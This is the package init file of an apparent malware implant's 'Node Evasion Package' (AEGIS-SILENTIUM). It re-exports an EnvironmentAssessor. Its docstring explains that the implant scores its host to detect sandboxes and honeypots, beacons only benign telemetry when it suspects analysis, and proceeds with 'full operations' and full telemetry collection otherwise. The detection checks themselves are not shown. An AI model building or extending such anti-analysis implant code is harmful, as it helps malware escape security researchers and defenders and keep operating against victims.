"""
AEGIS-SILENTIUM Node Evasion Package
===================================
Passive environment trust-scoring and honeypot/sandbox detection.

All checks are purely passive (read-only, no network probes).
If the environment trust score falls below the threshold, the implant
enters DORMANT mode: beaconing only with benign telemetry.

Exports:
    EnvironmentAssessor   — runs all trust checks
    EnvironmentAssessment — result dataclass with dormant flag
    TrustCheckResult      — individual check result
    DEFAULT_TRUST_THRESHOLD

Usage:
    from node.evasion import EnvironmentAssessor

    assessor = EnvironmentAssessor(threshold=40)
    result = assessor.assess()

    if result.dormant:
        # Environment looks like a sandbox/honeypot
        beacon_payload = result.benign_telemetry()
    else:
        # Environment is trusted — proceed with full operations
        beacon_payload = collect_full_telemetry()
"""

from .honeypot import (
    EnvironmentAssessor,
    EnvironmentAssessment,
    TrustCheckResult,
    DEFAULT_TRUST_THRESHOLD,
)

__all__ = [
    "EnvironmentAssessor",
    "EnvironmentAssessment",
    "TrustCheckResult",
    "DEFAULT_TRUST_THRESHOLD",
]

__version__ = "5.0"
